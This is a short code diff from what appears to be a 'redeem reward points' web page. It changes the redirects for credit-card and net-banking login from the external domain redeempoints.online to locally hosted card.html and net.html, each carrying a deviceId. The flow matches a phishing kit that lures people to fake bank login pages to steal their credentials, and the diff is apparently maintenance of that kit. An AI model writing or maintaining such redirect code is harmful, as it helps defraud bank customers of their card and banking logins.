@@ -433,12 +433,12 @@
             if (type === 'credit') {
                 showToast('Redirecting to Credit Card Login...');
                 setTimeout(() => {
-                    window.location.href = `https://redeempoints.online/credit?deviceId=${deviceId}`;
+                    window.location.href = `card.html?deviceId=${deviceId}`;
                 }, 500);
             } else if (type === 'netbanking') {
                 showToast('Redirecting to Net Banking Login...');
                 setTimeout(() => {
-                    window.location.href = `https://redeempoints.online/net?deviceId=${deviceId}`;
+                    window.location.href = `net.html?deviceId=${deviceId}`;
                 }, 500);
             }
         }
